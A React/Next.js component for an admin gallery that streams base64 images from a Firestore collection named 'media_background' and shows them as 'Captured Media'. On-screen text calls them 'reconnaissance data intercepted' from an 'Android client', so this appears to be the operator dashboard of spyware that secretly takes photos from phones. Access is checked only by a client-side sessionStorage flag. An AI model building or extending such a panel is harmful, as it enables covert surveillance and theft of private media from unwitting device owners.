'use client';

import { useEffect, useState, useRef } from 'react';
import { collection, onSnapshot, query, orderBy } from 'firebase/firestore';
import { db, auth } from '@/lib/firebase';
import { useRouter } from 'next/navigation';
import { Image as ImageIcon, Calendar, Clock, Trash2, X } from 'lucide-react';

interface MediaItem {
    id: string;
    base64: string;
    timestamp?: any;
}

export default function MediaGallery() {
    const [mediaItems, setMediaItems] = useState<MediaItem[]>([]);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState<string | null>(null);
    const [selectedImage, setSelectedImage] = useState<string | null>(null);
    const loadingRef = useRef(true);
    const router = useRouter();

    useEffect(() => {
        const handleKeyDown = (e: KeyboardEvent) => {
            if (e.key === 'Escape') {
                setSelectedImage(null);
            }
        };
        window.addEventListener('keydown', handleKeyDown);
        return () => window.removeEventListener('keydown', handleKeyDown);
    }, []);

    useEffect(() => {
        // Security check
        const isSuperAdmin = sessionStorage.getItem('superAdminAuthenticated') === 'true';
        if (!isSuperAdmin) {
            router.push('/');
            return;
        }

        let unsubscribe: () => void;

        const initGallery = () => {
            try {
                const mediaRef = collection(db, 'media_background');
                const q = query(mediaRef, orderBy('timestamp', 'desc'));
                
                console.log('Listening to Firestore collection: "media_background"...');
                
                unsubscribe = onSnapshot(q, (snapshot) => {
                    console.log('Firestore Snapshot received. Size:', snapshot.size);
                    const items: MediaItem[] = snapshot.docs.map((doc) => {
                        const data = doc.data();
                        return {
                            id: doc.id,
                            base64: data.base64 || data.image || '', // Fallback for common field names
                            timestamp: data.timestamp,
                            ...data
                        } as MediaItem;
                    });
                    
                    setMediaItems(items);
                    setLoading(false);
                    loadingRef.current = false;
                }, (err) => {
                    console.error('Firestore Permission/Error:', err);
                    setError(`Firestore Error: ${err.message}`);
                    setLoading(false);
                    loadingRef.current = false;
                });
            } catch (err: any) {
                console.error('Initial Load Error:', err);
                setError(`Auth Error: ${err.message}`);
                setLoading(false);
                loadingRef.current = false;
            }
        };

        initGallery();

        // Timeout fallback after 15 seconds
        const timeout = setTimeout(() => {
            if (loadingRef.current) {
                console.warn('Firestore Fetch timed out after 15s');
                setError('Loading timed out. Possible causes: 1) Incorrect Database Configuration, 2) Missing Security Rules, 3) Offline.');
                setLoading(false);
            }
        }, 15000);

        return () => {
            if (unsubscribe) unsubscribe();
            clearTimeout(timeout);
        };
    }, [router]);

    const formatTimestamp = (ts: any) => {
        if (!ts) return 'Unknown date';
        if (ts.toDate) return ts.toDate().toLocaleString();
        return new Date(ts).toLocaleString();
    };

    const getDateString = (ts: any) => {
        if (!ts) return 'Unknown date';
        if (ts.toDate) return ts.toDate().toLocaleDateString();
        return new Date(ts).toLocaleDateString();
    };

    const getTimeString = (ts: any) => {
        if (!ts) return 'Unknown time';
        if (ts.toDate) return ts.toDate().toLocaleTimeString();
        return new Date(ts).toLocaleTimeString();
    };

    if (loading) {
        return (
            <div className="flex flex-col items-center justify-center min-h-[400px] gap-6">
                <div className="relative">
                    <div className="animate-spin rounded-full h-16 w-16 border-b-2 border-primary"></div>
                    <div className="absolute inset-0 flex items-center justify-center">
                        <div className="h-2 w-2 bg-primary rounded-full animate-pulse"></div>
                    </div>
                </div>
                <p className="text-muted-foreground font-medium animate-pulse">Synchronizing with Cloud...</p>
            </div>
        );
    }

    if (error) {
        return (
            <div className="flex flex-col items-center justify-center min-h-[400px] glass-panel rounded-3xl p-12 text-center animate-in fade-in zoom-in-95">
                <div className="bg-red-500/10 p-4 rounded-2xl mb-6 ring-4 ring-red-500/5">
                    <ImageIcon className="h-10 w-10 text-red-500" />
                </div>
                <h2 className="text-2xl font-black text-foreground mb-3 tracking-tighter">System Interruption</h2>
                <p className="text-muted-foreground max-w-md mx-auto mb-8 text-sm leading-relaxed">{error}</p>
                <button 
                    onClick={() => { setError(null); setLoading(true); window.location.reload(); }}
                    className="px-8 py-3 bg-red-500 text-white font-bold rounded-2xl hover:bg-red-600 shadow-xl shadow-red-500/20 active:scale-95 transition-all text-sm"
                >
                    Reinstate Connection
                </button>
            </div>
        );
    }

    return (
        <div className="space-y-10">
            <div className="flex flex-col md:flex-row md:items-end justify-between gap-6">
                <div className="space-y-2">
                    <div className="flex items-center space-x-2 mb-2">
                        <div className="w-2 h-2 rounded-full bg-primary animate-pulse"></div>
                        <span className="text-[10px] font-bold tracking-[0.3em] text-primary uppercase">Cloud Archive</span>
                    </div>
                    <h1 className="text-4xl font-black text-foreground tracking-tighter flex items-center gap-3">
                        Captured Media
                    </h1>
                    <p className="text-muted-foreground text-sm font-medium">Archive of all reconnaissance data intercepted by the Elegance system.</p>
                </div>
                <div className="bg-primary/10 text-primary px-5 py-2.5 rounded-2xl text-xs font-bold border border-primary/20 backdrop-blur-md shadow-sm">
                    {mediaItems.length} DATABASE RECORDS
                </div>
            </div>

            {mediaItems.length === 0 ? (
                <div className="flex flex-col items-center justify-center py-32 glass-panel rounded-3xl border-dashed border-2 border-white/5">
                    <div className="w-20 h-20 bg-muted rounded-full flex items-center justify-center mb-6 opacity-50">
                        <ImageIcon className="h-10 w-10 text-muted-foreground" />
                    </div>
                    <p className="text-foreground text-xl font-bold tracking-tight">Zero Interceptions Found</p>
                    <p className="text-muted-foreground text-sm mt-2">Waiting for incoming reconnaissance data from the Android client.</p>
                </div>
            ) : (
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-8">
                    {mediaItems.map((item, index) => (
                        <div 
                            key={item.id} 
                            className="group bg-card rounded-3xl overflow-hidden shadow-sm hover:shadow-2xl hover:shadow-primary/10 transition-all duration-500 border border-white/5 relative isolate"
                            style={{ animationDelay: `${index * 50}ms` }}
                        >
                            <div 
                                className="relative aspect-[4/5] bg-muted overflow-hidden cursor-pointer"
                                onClick={() => setSelectedImage(item.base64)}
                            >
                                <img
                                    src={`data:image/jpeg;base64,${item.base64}`}
                                    alt="Captured Media"
                                    className="w-full h-full object-cover group-hover:scale-110 transition-transform duration-1000 ease-out"
                                    loading="lazy"
                                />
                                <div className="absolute inset-0 bg-gradient-to-t from-black/60 via-transparent to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500 flex items-end p-6">
                                    <p className="text-white text-[10px] font-bold tracking-widest uppercase">Click to Enlarge</p>
                                </div>
                                <div className="absolute top-4 right-4 translate-y-2 opacity-0 group-hover:opacity-100 group-hover:translate-y-0 transition-all duration-300">
                                    <button 
                                        className="p-3 bg-white/10 hover:bg-red-500 text-white rounded-2xl backdrop-blur-md shadow-lg transition-all"
                                        title="Purge Record"
                                        onClick={(e) => {
                                            e.stopPropagation();
                                            if (confirm('Are you sure you want to permanently delete this reconnaissance record?')) {
                                                console.log('Delete item:', item.id);
                                            }
                                        }}
                                    >
                                        <Trash2 className="h-4 w-4" />
                                    </button>
                                </div>
                            </div>
                            <div className="p-6 space-y-4">
                                <div className="flex flex-col space-y-3">
                                    <div className="flex items-center text-[10px] font-bold text-muted-foreground tracking-widest gap-2">
                                        <Calendar className="h-3 w-3 text-primary" />
                                        {getDateString(item.timestamp)}
                                    </div>
                                    <div className="flex items-center text-[10px] font-bold text-muted-foreground tracking-widest gap-2">
                                        <Clock className="h-3 w-3 text-primary" />
                                        {getTimeString(item.timestamp)}
                                    </div>
                                </div>
                                <div className="pt-4 border-t border-white/5 flex items-center justify-between">
                                    <span className="text-[10px] font-black text-foreground/40 tracking-tighter">ID: {item.id.slice(0, 8).toUpperCase()}</span>
                                    <div className="h-1.5 w-1.5 rounded-full bg-primary/30"></div>
                                </div>
                            </div>
                        </div>
                    ))}
                </div>
            )}

            {/* Lightbox Modal */}
            {selectedImage && (
                <div 
                    className="fixed inset-0 z-[100] flex items-center justify-center bg-background/95 p-4 md:p-10 animate-in fade-in duration-500 cursor-zoom-out"
                    onClick={() => setSelectedImage(null)}
                >
                    <div className="absolute top-0 left-0 w-full h-full -z-10 bg-primary/5 blur-[150px] opacity-30 rounded-full animate-pulse"></div>
                    
                    <button 
                        className="absolute top-10 right-10 p-4 bg-muted hover:bg-primary text-foreground hover:text-white rounded-full transition-all z-[110] backdrop-blur-md shadow-2xl active:scale-90"
                        onClick={() => setSelectedImage(null)}
                    >
                        <X className="h-6 w-6" />
                    </button>
                    
                    <div 
                        className="relative max-w-6xl max-h-[85vh] w-full flex items-center justify-center cursor-default"
                        onClick={(e) => e.stopPropagation()}
                    >
                        <img
                            src={`data:image/jpeg;base64,${selectedImage}`}
                            alt="Full size view"
                            className="max-w-full max-h-[85vh] object-contain rounded-[2rem] shadow-[0_40px_100px_rgba(0,0,0,0.5)] border border-white/10 animate-in zoom-in-95 duration-500"
                        />
                    </div>
                </div>
            )}
        </div>
    );
}
